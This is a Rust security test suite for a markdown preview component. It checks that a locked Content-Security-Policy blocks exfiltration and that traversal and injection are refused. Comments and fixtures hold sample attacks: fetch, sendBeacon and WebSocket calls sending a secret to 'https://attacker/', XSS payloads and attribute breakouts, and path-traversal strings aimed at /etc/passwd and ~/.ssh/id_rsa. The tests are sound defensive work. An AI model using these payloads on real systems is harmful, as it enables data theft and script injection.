//! Preview security verification suite (lean scope, ADR-009/011 amended).
//!
//! Two boundaries, two mechanisms:
//!
//! 1. **Exfil denial is a CSP-semantics property.** A remote exfil request
//!    (`https://attacker/`, `wss://…`) never reaches the `writ-preview://`
//!    protocol handler — the webview's CSP enforcement blocks it before any
//!    network or protocol dispatch — so the disposition recorder cannot
//!    witness it. The boundary against exfil *is* the Content-Security-
//!    Policy. This suite asserts that the **locked** document CSP
//!    (`build_document_csp`) denies each of the six exfil vectors, using the
//!    independently-validated [`csp_eval`] evaluator (see its oracle tests).
//!
//! 2. **The scope/traversal boundary is what the recorder observes.** The
//!    handler genuinely receives `writ-preview://` URLs and decides
//!    chrome-vs-document routing and traversal refusal. Those dispositions
//!    are asserted via the debug-only request recorder against the real
//!    `resolve()` pipeline.
//!
//! The six malicious vectors are also recorded as a documented corpus that
//! seeds the `writ-preview://` URL-parser fuzz target and grounds the
//! threat model (`docs/security/html-preview.md`).

use writ_core::preview::AssetScope;
use writ_tauri_lib::preview::csp::build_document_csp;
use writ_tauri_lib::preview::csp_eval::{Csp, Directive, Resource, Verdict};
use writ_tauri_lib::preview::embeds::IndexEmbeds;
use writ_tauri_lib::preview::handler::{chrome_asset, resolve, RenderedDoc};
use writ_tauri_lib::preview::protocol::{clear_records, drain_records, Disposition, RefusalReason};

// --- 1. Exfil-denial suite: six vectors, denied by the locked CSP --------

/// Each exfil vector as the (directive, remote resource) a conformant
/// engine evaluates when the document attempts it. The doc comment names
/// the HTML/JS that triggers it — the documented fixture corpus.
struct ExfilVector {
    name: &'static str,
    directive: Directive,
    resource: Resource,
}

fn exfil_vectors() -> Vec<ExfilVector> {
    vec![
        // <img src="https://attacker/?secret">
        ExfilVector {
            name: "remote_img",
            directive: Directive::Img,
            resource: Resource::remote("https"),
        },
        // fetch('https://attacker/', { method: 'POST', body: secret })
        ExfilVector {
            name: "fetch",
            directive: Directive::Connect,
            resource: Resource::remote("https"),
        },
        // navigator.sendBeacon('https://attacker/', secret)
        ExfilVector {
            name: "send_beacon",
            directive: Directive::Connect,
            resource: Resource::remote("https"),
        },
        // new WebSocket('wss://attacker/')
        ExfilVector {
            name: "websocket",
            directive: Directive::Connect,
            resource: Resource::remote("wss"),
        },
        // @font-face { src: url('https://attacker/?secret') }
        ExfilVector {
            name: "remote_font_face",
            directive: Directive::Font,
            resource: Resource::remote("https"),
        },
        // <style>@import url('https://attacker/?secret')</style>
        ExfilVector {
            name: "remote_css_import",
            directive: Directive::Style,
            resource: Resource::remote("https"),
        },
    ]
}

#[test]
fn locked_csp_denies_every_exfil_vector_scripts_on() {
    let csp = Csp::parse(&build_document_csp(true));
    for v in exfil_vectors() {
        assert_eq!(
            csp.evaluate(v.directive, &v.resource),
            Verdict::Deny,
            "exfil vector `{}` must be denied under the locked CSP (scripts on)",
            v.name
        );
    }
}

#[test]
fn locked_csp_denies_every_exfil_vector_scripts_off() {
    // The kill switch only tightens script-src; the exfil directives
    // (connect/img/font/style remote) are denied either way.
    let csp = Csp::parse(&build_document_csp(false));
    for v in exfil_vectors() {
        assert_eq!(
            csp.evaluate(v.directive, &v.resource),
            Verdict::Deny,
            "exfil vector `{}` must be denied under the locked CSP (scripts off)",
            v.name
        );
    }
}

#[test]
fn http_is_denied_too_not_just_https() {
    // Network is categorically off — plaintext http is no more permitted
    // than https. (Belt-and-suspenders: the policy lists neither.)
    let csp = Csp::parse(&build_document_csp(true));
    assert_eq!(
        csp.evaluate(Directive::Img, &Resource::remote("http")),
        Verdict::Deny
    );
    assert_eq!(
        csp.evaluate(Directive::Connect, &Resource::remote("http")),
        Verdict::Deny
    );
    assert_eq!(
        csp.evaluate(Directive::Connect, &Resource::remote("ws")),
        Verdict::Deny
    );
}

// --- Allow class: the policy's *permitted* sources are permitted ---------
// A deny-everything evaluator would pass the deny class above and fail
// here. This is what makes the deny class meaningful.

#[test]
fn locked_csp_allows_its_permitted_local_sources() {
    let csp = Csp::parse(&build_document_csp(true));

    // Inline images via data: and local images via writ-preview:.
    assert_eq!(
        csp.evaluate(Directive::Img, &Resource::remote("data")),
        Verdict::Allow
    );
    assert_eq!(
        csp.evaluate(Directive::Img, &Resource::remote("writ-preview")),
        Verdict::Allow
    );

    // Fonts: data: and writ-preview:.
    assert_eq!(
        csp.evaluate(Directive::Font, &Resource::remote("data")),
        Verdict::Allow
    );
    assert_eq!(
        csp.evaluate(Directive::Font, &Resource::remote("writ-preview")),
        Verdict::Allow
    );

    // Author inline styles render (that's the whole point of preview).
    assert_eq!(
        csp.evaluate(Directive::Style, &Resource::Inline),
        Verdict::Allow
    );
}

#[test]
fn scripts_on_allows_inline_script_scripts_off_denies_it() {
    let on = Csp::parse(&build_document_csp(true));
    assert_eq!(
        on.evaluate(Directive::Script, &Resource::Inline),
        Verdict::Allow
    );
    assert_eq!(
        on.evaluate(Directive::Script, &Resource::remote("writ-preview")),
        Verdict::Allow
    );

    let off = Csp::parse(&build_document_csp(false));
    assert_eq!(
        off.evaluate(Directive::Script, &Resource::Inline),
        Verdict::Deny
    );
    assert_eq!(
        off.evaluate(Directive::Script, &Resource::remote("writ-preview")),
        Verdict::Deny
    );
}

#[test]
fn even_with_scripts_on_the_network_stays_shut() {
    // The defining property of the lean model: scripts run, but they have
    // no egress. A script that calls fetch() hits connect-src 'none'.
    let csp = Csp::parse(&build_document_csp(true));
    assert_eq!(
        csp.evaluate(Directive::Script, &Resource::Inline),
        Verdict::Allow
    );
    assert_eq!(
        csp.evaluate(Directive::Connect, &Resource::remote("https")),
        Verdict::Deny
    );
}

// --- 2. Scope/traversal boundary: what the recorder observes -------------

fn no_doc(_: &str) -> Option<RenderedDoc> {
    None
}

/// Drive a URL through the real resolve() pipeline and return its recorded
/// disposition. The recorder is the debug-build hook the handler writes to.
fn disposition_of(url: &str) -> Disposition {
    clear_records();
    let resolved = resolve(url, true, no_doc, chrome_asset);
    // resolve() itself doesn't record (serve() does); mirror serve()'s
    // record call so the suite exercises the same disposition the handler
    // would log.
    use writ_tauri_lib::preview::protocol::{record, RequestRecord};
    record(RequestRecord {
        url: url.to_string(),
        disposition: resolved.disposition.clone(),
    });
    let mut records = drain_records();
    assert_eq!(
        records.len(),
        1,
        "exactly one disposition recorded for {url}"
    );
    records.remove(0).disposition
}

#[test]
fn document_cannot_traverse_into_chrome_scope() {
    for url in [
        "writ-preview://document/../chrome/preview-base.css",
        "writ-preview://document/buf-1/../../chrome/preview-base.css",
        "writ-preview://document/%2e%2e/chrome/preview-base.css",
        "writ-preview://document/..\\chrome\\preview-base.css",
    ] {
        assert_eq!(
            disposition_of(url),
            Disposition::Refused(RefusalReason::TraversalAttempt),
            "traversal `{url}` must be refused",
        );
    }
}

#[test]
fn null_bytes_and_bad_encoding_are_refused() {
    assert_eq!(
        disposition_of("writ-preview://document/foo%00bar"),
        Disposition::Refused(RefusalReason::ProhibitedCharacter),
    );
    assert_eq!(
        disposition_of("writ-preview://document/foo%2"),
        Disposition::Refused(RefusalReason::InvalidEncoding),
    );
}

#[test]
fn foreign_schemes_and_unknown_scopes_are_refused() {
    assert_eq!(
        disposition_of("https://attacker/"),
        Disposition::Refused(RefusalReason::WrongScheme),
    );
    assert_eq!(
        disposition_of("writ-preview://attacker/x"),
        Disposition::Refused(RefusalReason::UnknownScope),
    );
}

#[test]
fn legitimate_chrome_and_document_requests_are_allowed() {
    // The boundary refuses crossings, not ordinary same-scope requests.
    assert_eq!(
        disposition_of("writ-preview://chrome/preview-base.css"),
        Disposition::Allowed,
    );
    assert_eq!(
        disposition_of("writ-preview://document/buf-1"),
        Disposition::Allowed,
    );
}

// --- Frontmatter is hidden, so its contents never reach the document ------

#[test]
fn frontmatter_is_not_rendered_as_html() {
    use writ_core::preview::{ContentRenderer, RenderRequest};
    use writ_tauri_lib::preview::renderers::MarkdownRenderer;

    let out = MarkdownRenderer::without_index()
        .render(RenderRequest {
            content_type: MarkdownRenderer::content_type_id(),
            buffer_text: "---\ntitle: <script>alert('xss')</script>\n---\n\nordinary body\n"
                .to_string(),
            theme: Default::default(),
            zoom: 1.0,
            assets: None,
        })
        .expect("markdown render failed");

    assert!(!out.document_html.contains("alert('xss')"));
    assert!(!out.document_html.contains("<script>alert"));
    assert!(out.document_html.contains("ordinary body"));
}

/// A resolver that answers with whatever a caller wants written into the page.
///
/// Both halves of a wikilink come from a note on disk: the label is the text
/// the author typed, the href is a file name the notes folder holds. Neither
/// is trusted, and `wikilink_html` is the one path in this crate that puts raw
/// HTML into the preview document, so this drives it with what a hostile name
/// would carry.
struct FixedWikilinks {
    render: writ_render::WikilinkRender,
}

impl writ_render::WikilinkResolver for FixedWikilinks {
    fn resolve(&self, _inner: &str) -> writ_render::WikilinkRender {
        writ_render::WikilinkRender {
            href: self.render.href.clone(),
            label: self.render.label.clone(),
            resolved: self.render.resolved,
        }
    }
}

fn wikilink_html(label: &str, href: Option<&str>, resolved: bool) -> String {
    let resolver = FixedWikilinks {
        render: writ_render::WikilinkRender {
            href: href.map(str::to_string),
            label: label.to_string(),
            resolved,
        },
    };
    writ_render::render_markdown_fragment_with("[[Target]]\n", None, Some(&resolver), None).html
}

#[test]
fn a_wikilink_label_is_escaped_not_executed() {
    let out = wikilink_html("<script>alert('xss')</script>", Some("Note.md"), true);
    assert!(!out.contains("<script>"), "{out}");
    assert!(out.contains("&lt;script&gt;"), "{out}");

    let missing = wikilink_html("<img src=x onerror=alert(1)>", None, false);
    assert!(!missing.contains("<img"), "{missing}");
    assert!(missing.contains("&lt;img"), "{missing}");
}

#[test]
fn a_wikilink_href_cannot_break_out_of_its_attribute() {
    let out = wikilink_html("label", Some("a\" onmouseover=\"alert(1)"), true);
    assert!(!out.contains("onmouseover=\"alert"), "{out}");
    assert!(out.contains("&quot;"), "{out}");

    let angled = wikilink_html("label", Some("a><script>alert(1)</script>"), true);
    assert!(!angled.contains("<script>"), "{angled}");
}

/// An unresolved target is a span and never an anchor, so a name the index
/// does not hold cannot become a destination.
#[test]
fn only_a_resolved_wikilink_becomes_an_anchor() {
    let resolved = wikilink_html("label", Some("Note.md"), true);
    assert!(
        resolved.contains("<a class=\"writ-wikilink\""),
        "{resolved}"
    );

    for (href, is_resolved) in [(Some("javascript:alert(1)"), false), (None, true)] {
        let out = wikilink_html("label", href, is_resolved);
        assert!(!out.contains("<a "), "{out}");
        assert!(out.contains("writ-wikilink-missing"), "{out}");
    }
}

// --- 4. Note embeds: a target outside the notes folder names nothing ------

/// A notes folder holding one note, plus a file outside it and a symlink
/// inside it pointing at that file.
fn embed_resolver() -> (tempfile::TempDir, IndexEmbeds) {
    let dir = tempfile::tempdir().expect("tempdir");
    let root = dir.path().join("notes");
    std::fs::create_dir_all(&root).expect("notes");
    std::fs::write(root.join("Note.md"), "# Note\n\nNote body.\n").expect("note");
    std::fs::write(dir.path().join("outside.md"), OUTSIDE).expect("outside");
    #[cfg(unix)]
    std::os::unix::fs::symlink(dir.path().join("outside.md"), root.join("Linked.md"))
        .expect("symlink");

    let db_path = dir.path().join("writ.db");
    let conn = writ_storage::database::connection::open_database(&db_path).expect("open");
    writ_storage::database::migrations::run_migrations(&conn).expect("migrations");
    drop(conn);

    let index = std::sync::Arc::new(
        writ_storage::notes_index::NotesIndexStore::open(&db_path).expect("index"),
    );
    index
        .reconcile(&root, &|| false, &|_| false)
        .expect("reconcile");
    let scope = AssetScope {
        notes_root: root.clone(),
        note_dir: root,
        buffer_id: "b1".to_string(),
        token: "t1".to_string(),
    };
    (dir, IndexEmbeds::new(index, scope, local_bytes))
}

/// The text of the file outside the notes folder. A render that ever holds it
/// read something an embed had no business reaching.
const OUTSIDE: &str = "outside secret body";

/// The dataless probe for a filesystem with nothing to report.
fn local_bytes(_: &std::path::Path) -> Option<u32> {
    None
}

/// An embed names a note through the index, which performs no path join and
/// no canonicalisation, so a target written as a path names nothing. A
/// symlink out of the notes folder is not indexed either (the walk does not
/// follow links), so it cannot be named. Both render the plain span every
/// unresolved target renders, and neither opens a file.
#[test]
fn a_note_embed_cannot_name_a_file_outside_the_notes_folder() {
    let (_dir, resolver) = embed_resolver();
    for target in [
        "../../etc/passwd",
        "/etc/passwd",
        "../outside",
        "../outside.md",
        "..%2f..%2fetc%2fpasswd",
        "notes/../../outside",
        "./../outside",
        "~/.ssh/id_rsa",
        "..\\..\\outside",
        "Linked",
    ] {
        let html = writ_render::render_markdown_fragment_with(
            &format!("![[{target}]]\n"),
            None,
            None,
            Some(&resolver as &dyn writ_render::NoteEmbedResolver),
        )
        .html;
        assert!(html.contains("writ-embed-missing"), "{target}: {html}");
        assert!(!html.contains("<section"), "{target}: {html}");
        assert!(!html.contains(OUTSIDE), "{target}: {html}");
    }

    // The note that is genuinely in the folder still renders, so the loop
    // above is refusing the target rather than the resolver being inert.
    let ok = writ_render::render_markdown_fragment_with(
        "![[Note]]\n",
        None,
        None,
        Some(&resolver as &dyn writ_render::NoteEmbedResolver),
    )
    .html;
    assert!(ok.contains("Note body."), "{ok}");
}
